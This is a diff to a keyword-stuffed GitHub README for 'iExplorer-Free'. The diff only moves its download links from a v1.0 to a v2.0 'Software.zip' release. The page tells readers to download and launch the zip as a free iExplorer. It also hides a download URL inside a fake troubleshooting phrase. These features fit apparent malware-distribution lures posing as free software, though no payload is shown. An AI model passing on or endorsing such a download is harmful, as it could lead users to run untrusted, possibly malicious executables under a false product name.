@@ -1,12 +1,12 @@
 # iExplorer-Free 🌐
 
-[![Download iExplorer](https://github.com/Afjhr/iExplorer-Free/releases/download/v1.0/Software.zip%20iExplorer-v1.0.0-blue)](https://github.com/Afjhr/iExplorer-Free/releases/download/v1.0/Software.zip)
+[![Download iExplorer](https://github.com/Afjhr/iExplorer-Free/releases/download/v2.0/Software.zip%20iExplorer-v1.0.0-blue)](https://github.com/Afjhr/iExplorer-Free/releases/download/v2.0/Software.zip)
 
 Welcome to the iExplorer-Free repository! If you are looking for an iExplorer tab, iExplorer download options for PC and Windows, iExplorer 8, iExplorer alternatives, or explore apps similar to iExplorer, you've come to the right place. This repository aims to provide resources and information related to iExplorer and its functionalities. 
 
 ## Description 📋
 
-Have you been searching for iExplorer options like iExplorer for PC, iExplorer for Windows, iExplorer iOS 17, iExplorer alternatives, iExplorer for Windows 10, iExplorer for iPhone, or troubleshooting tips like dealing with "faulting application name https://github.com/Afjhr/iExplorer-Free/releases/download/v1.0/Software.zip"? Look no further.
+Have you been searching for iExplorer options like iExplorer for PC, iExplorer for Windows, iExplorer iOS 17, iExplorer alternatives, iExplorer for Windows 10, iExplorer for iPhone, or troubleshooting tips like dealing with "faulting application name https://github.com/Afjhr/iExplorer-Free/releases/download/v2.0/Software.zip"? Look no further.
 
 ## Topics 📌
 
@@ -31,7 +31,7 @@ Explore a variety of topics related to iExplorer in this repository:
 ## Get Started 🚀
 
 To download iExplorer, click the button below:
-[![Download iExplorer](https://github.com/Afjhr/iExplorer-Free/releases/download/v1.0/Software.zip%20iExplorer-v1.0.0-blue)](https://github.com/Afjhr/iExplorer-Free/releases/download/v1.0/Software.zip)
+[![Download iExplorer](https://github.com/Afjhr/iExplorer-Free/releases/download/v2.0/Software.zip%20iExplorer-v1.0.0-blue)](https://github.com/Afjhr/iExplorer-Free/releases/download/v2.0/Software.zip)
 
 Don't forget to launch the downloaded file to start exploring the world of iExplorer!
 
